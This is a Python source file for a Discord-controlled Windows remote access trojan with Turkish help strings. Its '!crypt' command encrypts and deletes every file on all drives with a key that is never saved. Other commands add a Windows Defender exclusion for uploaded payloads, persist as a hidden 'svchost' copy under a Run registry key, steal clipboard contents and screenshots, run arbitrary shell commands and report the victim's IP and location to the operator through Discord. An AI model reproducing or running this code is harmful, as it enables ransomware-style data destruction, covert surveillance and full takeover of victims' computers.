import os
import certifi
os.environ['SSL_CERT_FILE'] = certifi.where()
import sys
import ctypes
import discord
from discord.ext import commands
import subprocess
import tempfile
import io
import random
import string
import shutil
import webbrowser
import platform
import winreg
import psutil
import pyperclip
import pyautogui
import mss
from PIL import ImageGrab, Image
import requests
import threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets
import asyncio

TOKEN = "BOT_TOKEN"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

encrypted_count = 0
count_lock = threading.Lock()
self_path = os.path.abspath(sys.argv[0])
key = secrets.token_bytes(32)
crypt_lock = asyncio.Lock()
total_files = 0

def encrypt_file(file_path, new_ext):
    global encrypted_count

    if os.path.abspath(file_path) == self_path:
        return False

    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        if not data:
            return False

        iv = secrets.token_bytes(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len] * pad_len)

        ct = encryptor.update(data) + encryptor.finalize()
        encrypted_data = iv + ct

        new_file = file_path + '.' + new_ext
        with open(new_file, 'wb') as f:
            f.write(encrypted_data)

        os.remove(file_path)

        with count_lock:
            encrypted_count += 1

        return True

    except Exception:
        return False

def scan_count_files(directory):
    count = 0
    try:
        for entry in os.scandir(directory):
            if entry.name in ('.', '..'):
                continue
            full_path = entry.path
            if entry.is_dir(follow_symlinks=False):
                count += scan_count_files(full_path)
            elif entry.is_file(follow_symlinks=False):
                count += 1
    except (PermissionError, FileNotFoundError):
        pass
    except Exception:
        pass
    return count

def scan_and_encrypt(directory, new_ext, progress_callback=None):
    try:
        for entry in os.scandir(directory):
            if entry.name in ('.', '..'):
                continue
            full_path = entry.path
            if entry.is_dir(follow_symlinks=False):
                scan_and_encrypt(full_path, new_ext, progress_callback)
            elif entry.is_file(follow_symlinks=False):
                if encrypt_file(full_path, new_ext) and progress_callback:
                    progress_callback()
    except (PermissionError, FileNotFoundError):
        pass
    except Exception:
        pass

def get_logical_drives():
    drives = []
    bitmask = ctypes.cdll.kernel32.GetLogicalDrives()
    for i in range(26):
        if bitmask & (1 << i):
            drives.append(chr(65 + i) + ':\\')
    return drives

@bot.command(help="Tüm dosyaları şifreler, yeni uzantı belirlenir (örn: !crypt azrail)")
async def crypt(ctx, new_ext: str):
    global encrypted_count, total_files

    if crypt_lock.locked():
        await ctx.send("Zaten bir şifreleme işlemi devam ediyor. Lütfen bitmesini bekleyin.")
        return

    async with crypt_lock:
        new_ext = new_ext.strip().lstrip('.')
        if not new_ext.isalnum():
            await ctx.send("Uzantı sadece harf ve rakamlardan oluşmalı.")
            return

        encrypted_count = 0
        total_files = 0

        await ctx.send("🔍 Dosyalar taranıyor, lütfen bekleyin...")

        drives = get_logical_drives()
        user_profile = os.environ.get('USERPROFILE')

        def count_all_files():
            global total_files
            for d in drives:
                total_files += scan_count_files(d)
            if user_profile:
                total_files += scan_count_files(user_profile)

        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, count_all_files)

        if total_files == 0:
            await ctx.send("Hiç dosya bulunamadı.")
            return

        await ctx.send(f"🔐 Şifreleme başlatıldı ({total_files} dosya bulunmuş)...")

        def progress_callback():
            global encrypted_count
            with count_lock:
                encrypted_count += 1

        tasks = []
        for drive in drives:
            tasks.append(asyncio.to_thread(scan_and_encrypt, drive, new_ext, progress_callback))
        if user_profile:
            tasks.append(asyncio.to_thread(scan_and_encrypt, user_profile, new_ext, progress_callback))

        await asyncio.gather(*tasks)

        await ctx.send(f"✅ Şifreleme tamamlandı.\nToplam dosya: {total_files}\nŞifrelenen dosya: {encrypted_count}")

def gizle_dosya_yolu(dosya_yolu):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(dosya_yolu, 2)
    except:
        pass

@bot.command(help="Dosya yükler ve Defender hariç tutma yapmaya çalışır")
async def upload(ctx):
    try:
        if not ctx.message.attachments:
            return await ctx.send("❌ Dosya eklenmedi")

        ek = ctx.message.attachments[0]
        dosya_adi = ek.filename
        yeni_ad = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + os.path.splitext(dosya_adi)[1]
        yol = os.path.join(tempfile.gettempdir(), yeni_ad)

        await ek.save(yol)
        gizle_dosya_yolu(yol)

        try:
            subprocess.run(f"powershell Add-MpPreference -ExclusionPath '{yol}'", shell=True, timeout=5)
            defender = "Evet"
        except:
            defender = "Hayır"

        await ctx.send(f"✅ Dosya yüklendi\n📂 Yol: `{yol}`\n🛡️ Defender Hariç Tutma: {defender}")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command(help="Botu başlangıca gizli şekilde ekler")
async def startup(ctx):
    try:
        mevcut_yol = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]

        if getattr(sys, 'frozen', False):
            dosya_uzantisi = '.exe'
        else:
            dosya_uzantisi = '.py'
        
        hedef_klasor = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', 'svchost')
        os.makedirs(hedef_klasor, exist_ok=True)
        
        hedef_dosya_adi = f"svchost{dosya_uzantisi}"
        hedef_yol = os.path.join(hedef_klasor, hedef_dosya_adi)
        
        if not os.path.exists(hedef_yol):
            shutil.copy2(mevcut_yol, hedef_yol)
            ctypes.windll.kernel32.SetFileAttributesW(hedef_yol, 2)
        
        key_yolu = r"Software\Microsoft\Windows\CurrentVersion\Run"
        rastgele_anahtar = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_yolu, 0, winreg.KEY_READ) as key:
            mevcut_anahtarlar = [winreg.EnumValue(key, i)[0] for i in range(winreg.QueryInfoKey(key)[1])]
        
        if rastgele_anahtar not in mevcut_anahtarlar:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_yolu, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, rastgele_anahtar, 0, winreg.REG_SZ, hedef_yol)
            mesaj = f"✓ Başlangıca gizli şekilde eklendi: {rastgele_anahtar}"
        else:
            mesaj = "⚠ Zaten başlangıçta kayıtlı"
        
        await ctx.send(mesaj)
    except Exception as e:
        await ctx.send(f"❌ Hata: {str(e)}")

@bot.command(help="Pano içeriğini (yazı veya resim) gönderir")
async def clipboard(ctx):
    try:
        pano = pyperclip.paste()
        if pano.strip():
            if len(pano) > 1500:
                with io.StringIO(pano) as f:
                    await ctx.send(file=discord.File(f, filename="pano.txt"))
            else:
                await ctx.send(f"```{pano}```")
            return

        img = ImageGrab.grabclipboard()
        if isinstance(img, Image.Image):
            with io.BytesIO() as b:
                img.save(b, format='PNG')
                b.seek(0)
                await ctx.send(file=discord.File(b, filename="pano.png"))
            return

        await ctx.send("Pano boş veya desteklenmeyen içerik")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command(help="Çalışan işlemleri listeler")
async def tasklist(ctx):
    try:
        veriler = [f"{p.info['pid']}\t{p.info['name'][:12]}\t{p.info['cpu_percent']:.1f}\t{p.info['memory_percent']:.1f}" for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]
        parcalar = ["```PID\tAd\tCPU\tBellek"] + veriler[:30] + ["```"]
        await ctx.send("\n".join(parcalar))
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command(help="İsimle işlem sonlandırır (örn: !taskkill chrome.exe)")
async def taskkill(ctx, isim: str):
    try:
        for p in psutil.process_iter(['pid', 'name']):
            if p.info['name'].lower() == isim.lower():
                psutil.Process(p.info['pid']).terminate()
                await ctx.send(f"✓ {isim} sonlandırıldı")
                return
        await ctx.send("Bulunamadı")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command(help="Komut satırında komut çalıştırır")
async def cmd(ctx, *, komut: str):
    try:
        p = subprocess.Popen(komut, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        cikti, hata = p.communicate()
        sonuc = cikti.decode(errors='replace') or ""
        hata_ = hata.decode(errors='replace') or ""
        tam = f"Çıktı:\n{sonuc}\nHata:\n{hata_}" if hata_ else f"Çıktı:\n{sonuc}"
        await ctx.send(f"```{tam[:1900]}```")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command(help="Sistem bilgilerini gönderir")
async def pcinfo(ctx):
    try:
        ip = requests.get("http://ip-api.com/json/").json()
        ram = psutil.virtual_memory().total / (1024 ** 3)
        disk = psutil.disk_usage('/').total / (1024 ** 3)
        osbilgi = f"{platform.system()} {platform.release()}"
        await ctx.send(f"📡 IP: {ip.get('query')}\n📍 Konum: {ip.get('city')}, {ip.get('country')}\n💻 OS: {osbilgi}\n💾 Disk: {disk:.2f}GB\n🧠 RAM: {ram:.2f}GB")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command(help="Ekran görüntüsü alır ve gönderir")
async def screen(ctx):
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
        with mss.mss() as ekran:
            ekran.shot(output=f.name)
        try:
            await ctx.send(file=discord.File(f.name))
        finally:
            os.remove(f.name)

@bot.command(help="Belirtilen URL'yi varsayılan tarayıcıda açar")
async def website(ctx, *, url: str):
    try:
        if not url.startswith("http"):
            url = "https://" + url
        webbrowser.open(url)
        await ctx.send(f"Web açıldı: {url}")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command(help="Ekranda mesaj kutusu gösterir")
async def message(ctx, *, mesaj: str):
    try:
        pyautogui.alert(mesaj)
        await ctx.send("Mesaj gösterildi")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command(help="Bot komut listesini gösterir")
async def help(ctx):
    help_text = "**Komut Listesi:**\n"
    for cmd in bot.commands:
        desc = cmd.help if cmd.help else "Açıklama yok"
        help_text += f"• `!{cmd.name}` — {desc}\n"

    if len(help_text) > 2000:
        chunks = [help_text[i:i+1900] for i in range(0, len(help_text), 1900)]
        for chunk in chunks:
            await ctx.send(chunk)
    else:
        await ctx.send(help_text)


if __name__ == "__main__":
    bot.run(TOKEN)
